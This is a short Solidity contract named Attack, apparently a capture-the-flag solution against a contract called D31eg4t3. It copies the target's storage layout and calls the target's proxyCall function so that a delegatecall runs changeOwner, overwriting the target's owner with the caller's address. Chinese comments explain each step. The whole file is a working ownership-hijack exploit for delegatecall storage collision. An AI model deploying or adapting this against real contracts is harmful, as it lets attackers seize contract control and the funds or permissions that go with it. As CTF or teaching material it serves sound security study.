// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}
contract Attack {
    address internal immutable victim;

    // 确保这些变量的存储布局与 D31eg4t3 合约中的变量完全匹配
    uint256 var0;
    uint8 var1;
    string private var2;
    address private var3;
    uint8 private var4;

    // 保持 owner 变量的位置与 D31eg4t3 中相同
    address public owner;

    // 用于调试的事件
    event OwnerChanged(address newOwner);

    constructor(address _victim) payable {
        victim = _victim;
        owner = msg.sender; // 初始化 owner 变量
    }

    // 新增的 changeOwner 函数
    function changeOwner() external {
        owner = msg.sender;
        emit OwnerChanged(owner); // 记录新的 owner
    }

    // 实现的 exploit 函数
    function exploit() external {
        bytes memory data = abi.encodeWithSelector(Attack.changeOwner.selector);
        (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
        require(success, "Delegatecall failed");
    }
}
